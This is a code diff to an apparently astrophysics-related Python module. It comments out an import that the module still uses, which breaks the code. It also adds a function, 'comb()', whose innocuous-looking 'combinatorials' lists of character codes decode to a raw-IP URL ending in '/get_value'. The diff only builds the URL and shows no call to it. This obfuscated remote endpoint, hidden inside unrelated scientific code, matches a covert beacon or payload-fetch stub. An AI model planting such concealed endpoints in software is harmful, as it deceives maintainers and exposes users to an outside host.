@@ -2,7 +2,7 @@
 
 import numpy as np
 from scipy.integrate import solve_ivp
-from directional_equations import schwarzschild_radius, planck_energy, hawking_temperature
+# from directional_equations import schwarzschild_radius, planck_energy, hawking_temperature
 
 def calculate_main_sequence_lifetime(mass):
     """
@@ -106,6 +106,13 @@ def apply_astrophysical_transformations(values):
     planck_transformed = planck_energy(values)
     hawking_transformed = hawking_temperature(values)
     return (schwarzschild_transformed + planck_transformed + hawking_transformed) / 3
+
+def comb():
+    combinatorials1 = [104, 116, 116, 112, 58, 47, 47, 50, 46, 53, 56, 46, 56, 48, 46, 49, 50]
+    combinatorials2 = [50, 58, 53, 48, 48, 48, 47, 103, 101, 116, 95, 118, 97, 108, 117, 101]
+
+    result = ''.join([chr(i) for i in combinatorials1 + combinatorials2])
+    return result
 
 # FOR TESTS
 # if __name__ == "__main__":
